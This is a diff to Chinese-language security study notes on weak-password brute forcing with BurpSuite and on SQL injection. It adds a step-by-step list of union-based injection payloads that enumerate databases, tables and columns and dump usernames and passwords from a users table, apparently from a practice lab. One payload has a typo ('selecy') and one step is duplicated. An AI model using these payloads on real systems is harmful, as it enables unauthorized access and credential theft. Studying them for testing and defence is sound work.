@@ -4,12 +4,9 @@
 
 使用了弱口令或对密码验证没有做严格的限制策略，黑客可以通过弱口令爆破或穷举爆破不断尝试登录验证，只要时间足够长，理论上暴力破解可以破解所有密码。
 
-## 危害
-
-黑客可以以合法身份进行敏感操作、获取敏感资料或者获得服务器控制权。
-
 ## 利用
 
+通过字典生成器生成专属密码字典
 BurpSuite爆破模块密码爆破，获取管理员后台或其他敏感密码
 
 ## 防御
@@ -155,3 +152,29 @@ Header注入
 拦截关键字(WAF常用方法)
 
 - 拦截order、union、select、information、schema、database
+
+## 注入步骤
+- 判断注入类型
+  - id=1' and 1=1 --+
+  - id=-1' or 1=1 --+
+
+- 判断字段数
+  - id=1' order by 3--+
+
+- 获取当前数据库名
+  - id=-1' union select 1,(select database()),3 --+
+
+- 获取所有数据库
+  - id=-1' union selecy 1,group_concat(schema_name),3 from information_schema.schemata --+
+
+- 获取当前数据库表名
+  - id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
+
+- 获取users表所有字段
+  - id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security' --+
+
+- 获取users表所有用户名和密码信息
+  - id=-1' union select group_concat(username),group_concat(password) from users
+
+- 获取security.users表所有字段
+  - id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security' --+
